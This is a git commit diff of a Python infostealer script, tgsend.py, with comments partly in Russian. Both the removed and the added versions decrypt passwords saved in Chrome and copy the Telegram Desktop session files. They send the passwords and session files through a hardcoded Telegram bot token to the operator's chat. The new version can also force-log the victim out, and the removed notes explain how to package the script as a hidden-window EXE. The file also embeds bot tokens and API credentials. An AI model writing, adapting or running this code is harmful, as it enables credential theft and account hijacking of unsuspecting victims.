90a92e3fb44c7bf0a82bcba83340d375ff2143aa
sergava <38960886+sergava@users.noreply.github.com>
2020-05-16 09:26:46 +0300

    telethon changed to telebot, deleted archiving useless files, improved reliability

--- tgsend.py
+++ tgsend.py
@@ -1,64 +1,44 @@
-from telethon import TelegramClient
-import fnmatch
-import shutil
-import glob
-from datetime import datetime
-from zipfile import ZipFile
-import json
-from base64 import b64decode
-from win32crypt import CryptUnprotectData
-from Crypto.Cipher import AES
-import os
-import sqlite3
-import io
-
-"""
-УСТАНОВИТЕ ВСЕ НЕОБХОДИМЫЕ БИБЛИОТЕКИ
-cmd > pip install ИМЯ_БИБЛИОТЕКИ
-
-@hlibchyk - telegram по всем вопросам
-Спасибо огромное @Functioncc за помощь
-
-Если при компиляции в EXE у вас не нашло модуль - добавьте с помощью аргумента --hidden-import="ИМЯ БИБЛИОТЕКИ"
-НАПРИМЕР:
-pyinstaller -y -F -w --hidden-import="ИМЯ БИБЛИОТЕКИ" "ПУТЬ/К/НАШЕМУ/ФАЙЛУ.py"
-При ошибке "Failed to execute script pyi_rth_pkgres" пишем вместо "ИМЯ БИБЛИОТЕКИ" "pkg_resources.py2_warn"
-"""
+try:
+    from telebot import TeleBot
+    import shutil
+    import json
+    from base64 import b64decode
+    from win32crypt import CryptUnprotectData
+    from Crypto.Cipher import AES
+    import os
+    import sqlite3
+except:
+    print("Error importing")
+    pass
 
 
-
-################ зададим несколько пременных ################
-name = 'bot'                                                 # любое имя
-user_id = 441449437                                          # в @userinfobot ваш айди
-app_id = 1364464                                             # https://my.telegram.org/auth?to=apps - берем его здесь
-api_hash = '7fbd3b60e149a572735ffc6cad44132c'                # https://my.telegram.org/auth?to=apps - берем его здесь
-token = '1182956398:AAHDGIDNM4pS0P_nSrxFsMXGuF9kW2HzSJY'     # @BotFather - создаєм там бота и копируем токен
-name_ur_txt = 'default.txt'                                  # Вводим имя будущего тхт файла с паролями(.txt не трогаем)
-#############################################################
-""""
-!!!ВАЖНО НАЖАТЬ КНОПКУ [СТАРТ] В ВАШЕМ БОТЕ!!!!!!!!!! 
-иначе нихрена не придет
-"""
+log_out = 0  # 1 - is on, 0 - is off
 
 
+user_id = 441449437
+token = '1265089268:AAEfhXYnRGe0Npj_DXxmN9aXZpVh8U4sO_g'
+name_ur_txt = 'pass.txt'
 
-bot = TelegramClient(name, app_id, api_hash).start(bot_token=token)
-name_archive = str(datetime.now().strftime("%d_%m_%y_%I_%M"))
+
+bot = TeleBot(token)
 pathusr = os.path.expanduser('~')
-paths = ['C:/','D:/','E:/','F:/','G:/','H:/','I:/','J:/'] #несколько дисков где будем искать папку телеграм если она не на дефолтном месте
-pattern = 'Telegram Desktop'
+paths = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/']
+path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')
 
-path = r'%LocalAppData%\Google\Chrome\User Data\Local State'
-path = os.path.expandvars(path)
 
-########## ищем мастеркей для паролей гугл хрома#########
-with open(path) as f:
-    load = json.load(f)["os_crypt"]["encrypted_key"]
-    master_key = b64decode(load)
-    master_key = master_key[5:]
-    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+def getmasterkey():
+    try:
+        with open(path) as f:
+            load = json.load(f)["os_crypt"]["encrypted_key"]
+            master_key = b64decode(load)
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
+    except:
+        print("can't access masterkey")
+        pass
 
-######## функция расшифровки паролей ###########
+
 def decryption(buff, key):
     payload = buff[15:]
     iv = buff[3:15]
@@ -68,12 +48,12 @@ def decryption(buff, key):
     return decrypted_pass
 
 
-######## пиздим зашифрованные пароли с хрома и сразу расшифровываем и возвращаем уже результат ##############
 def Chrome():
     text = 'YOUR PASSWORDS\n'
     try:
         if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
-            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
+            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
+                         os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
             conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
             cursor = conn.cursor()
             cursor.execute('SELECT action_url, username_value, password_value FROM logins')
@@ -81,88 +61,92 @@ def Chrome():
                 password = result[2]
                 login = result[1]
                 url = result[0]
-                decrypted_pass = decryption(password, master_key)
+                decrypted_pass = decryption(password, getmasterkey())
                 text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
+                with open(name_ur_txt, "w", encoding="utf-8") as f:
+                    f.write(text)
     except:
-        print("error")
+        print("error in Chrome()")
         pass
-    return text
 
-########### функция поиска папки с телеграмом ##################
-def finddir(pattern, path):
+
+def finddir(path):
     for root, dirs, files in os.walk(path):
         for name in dirs:
-            if fnmatch.fnmatch(name, str.lower(pattern)):
+            if name == "Telegram Desktop":
                 found = os.path.join(root, name)
-                return found
-            else:
-                pass
+                print(found)
+                if os.path.exists(found + '\\Telegram.exe'):
+                    return found
 
-if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):           # если телеграм установлен по стандартному пути
+
+if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
     tddir = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
     tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
-    tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"
-    hash_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'
 else:
-    for i in paths:                                     # если телеграм установлен не по стандартному пути, ищем папки 'Telegram Desktop'
-        tddir = finddir(pattern, i)
-        if (tddir is not None and os.path.exists(tddir + '\\Telegram.exe')): #если есть такая папка и там есть Telegram.exe
-            ###### изменяем константы #######
+    for i in paths:
+        tddir = finddir(i)
+        if tddir is not None:
             tdata_path = tddir + '\\tdata\\'
-            tdata_session_zip = tddir + '\\' + name_archive + ".zip"
-            hash_path = tddir + '\\tdata\\D877F783D5D3EF8?*'
             break
         else:
-            continue
+            pass
 
-##### делаем несколько папок ##########
-try:
-    os.mkdir(tdata_path + '\\connection_hash')
-    os.mkdir(tdata_path + '\\map')
-except:
-    pass
-######### копируем файлы сессии #########
-hash_map = glob.iglob(os.path.join(hash_path, "*"))
-for file in hash_map:
-    if os.path.isfile(file):
-        shutil.copy2(file, tdata_path + '\\map')
 
-files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
-for file in files16:
-    if os.path.isfile(file):
-        shutil.copy2(file, tdata_path + '\\connection_hash')
+def logout_windows(bool):
+    if bool:
+        try:
+            global pathd877
+            os.system('taskkill /f /im Telegram.exe')
+            os.remove(pathd877)
+        except Exception as e:
+            print("failed to logout")
+            print(repr(e))
+            pass
+    else:
+        print("logout is not on")
+        pass
 
-######## делаем архив с сессией ##########
-with ZipFile(tddir + '\\session.zip', 'w') as zipObj:
-    for folderName, subfolders, filenames in os.walk(tddir + '\\tdata\\map'):
-        for filename in filenames:
-            filePath = os.path.join(folderName, filename)
-            zipObj.write(filePath)
-    for folderName, subfolders, filenames in os.walk(tddir + '\\tdata\\connection_hash'):
-        for filename in filenames:
-            filePath = os.path.join(folderName, filename)
-            zipObj.write(filePath)
 
-old_file_zip = os.path.join(tddir, 'session.zip')     ###переименуем наш архив
-file_zip = os.path.join(tddir, name_archive + ".zip")
-os.rename(old_file_zip, file_zip)
+def send_txt():
+    try:
+        bot.send_document(user_id, open(name_ur_txt,'rb'))
+        os.remove(name_ur_txt)
+    except Exception as e:
+        print("Error in send_txt()")
+        print(repr(e))
+        pass
 
-with io.open(name_ur_txt, "w", encoding="utf-8") as f: #пишем вывод в файл (хз почему через ио. Вроде не крашается)
-    f.write(Chrome())
-f.close()
 
-########## главная функция ##########################################################
-async def main(): #telethon работает асинхронно
-    await bot.send_file(user_id, name_ur_txt) #кидаем файл с паролями через бота
-    os.remove(name_ur_txt)                    #удаляем файл
-    await bot.send_file(user_id, file_zip)    #кидаем архив сессии через бота
+def send_session_files():
+    for root, dirs, files in os.walk(tdata_path):
+        for dir in dirs:
+            if dir[0:15] == "D877F783D5D3EF8":
+                mapsdir = os.path.join(tdata_path, dir)
+        for file in files:
+            if file[0:15] == "D877F783D5D3EF8":
+                print("match D877F783D5D3EF8")
+                global pathd877
+                pathd877 = os.path.join(tdata_path, file)
+                bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'))
+            elif file == "maps":
+                print("match maps")
+                bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'))
 
-    ### дальше удаляем созданные нами файлы
-    shutil.rmtree(tdata_path + '\\connection_hash', ignore_errors=True, onerror=None)
-    shutil.rmtree(tdata_path + '\\map', ignore_errors=True, onerror=None)
-    os.remove(file_zip)
 
-"""____________ЗАПУСК____________"""
-with bot:
-    bot.loop.run_until_complete(main())
-######################################################################################
+def main():
+    try:
+        Chrome()
+        user = pathusr + " " + tddir
+        bot.send_message(user_id, user)
+        send_txt()
+        send_session_files()
+        logout_windows(log_out)
+    except Exception as e:
+        print(repr(e), 'Main function error')
+        pass
+
+
+if __name__ == '__main__':
+    main()
+
